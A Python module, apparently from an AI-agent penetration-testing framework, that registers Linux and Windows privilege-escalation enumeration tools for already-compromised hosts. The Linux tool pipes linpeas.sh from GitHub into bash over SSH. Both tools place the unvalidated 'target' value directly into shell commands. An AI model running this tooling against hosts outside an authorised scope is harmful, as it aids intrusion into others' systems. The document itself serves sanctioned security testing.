"""Post-exploitation tooling: privilege escalation enumeration.

These tools only run once a foothold already exists (the agent has a shell on
the target) and are the highest-risk tier in HexSwarm. They are gated the
same way as every other tool: scope + risk level, checked by ScopeGuard
before the subprocess ever starts.
"""
from __future__ import annotations

from typing import Any, ClassVar

from hexswarm.safety.guard import ToolRiskLevel
from hexswarm.tools.base import Tool, ToolRegistry


class LinuxPrivescEnum(Tool):
    name: ClassVar[str] = "linux_privesc_enum"
    description: ClassVar[str] = (
        "Runs linpeas.sh on a Linux host that has already been compromised (via an existing "
        "shell/SSH session identified as 'target') to enumerate local privilege escalation "
        "vectors: SUID binaries, cron jobs, writable services, kernel exploits, etc."
    )
    binary: ClassVar[str] = "linpeas.sh"
    risk_level: ClassVar[ToolRiskLevel] = ToolRiskLevel.POST_EXPLOIT
    timeout_seconds: ClassVar[int] = 300
    parameters_schema: ClassVar[dict[str, Any]] = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "SSH connection string for the compromised host, user@host.",
            },
        },
        "required": ["target"],
    }

    def build_command(self, **kwargs: Any) -> list[str]:
        return ["ssh", kwargs["target"], "bash -c 'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash'"]


class WindowsPrivescEnum(Tool):
    name: ClassVar[str] = "windows_privesc_enum"
    description: ClassVar[str] = (
        "Runs a WinPEAS-style enumeration (via a PowerShell remoting session identified as "
        "'target') on an already-compromised Windows host to find local privilege escalation "
        "vectors: misconfigured services, unquoted paths, stored credentials, AlwaysInstallElevated."
    )
    binary: ClassVar[str] = "winpeas.exe"
    risk_level: ClassVar[ToolRiskLevel] = ToolRiskLevel.POST_EXPLOIT
    timeout_seconds: ClassVar[int] = 300
    parameters_schema: ClassVar[dict[str, Any]] = {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "PowerShell remoting target (ComputerName) for the compromised host.",
            },
        },
        "required": ["target"],
    }

    def build_command(self, **kwargs: Any) -> list[str]:
        return [
            "pwsh", "-NonInteractive", "-Command",
            f"Invoke-Command -ComputerName {kwargs['target']} -FilePath ./winpeas.ps1",
        ]


ToolRegistry.register(LinuxPrivescEnum())
ToolRegistry.register(WindowsPrivescEnum())
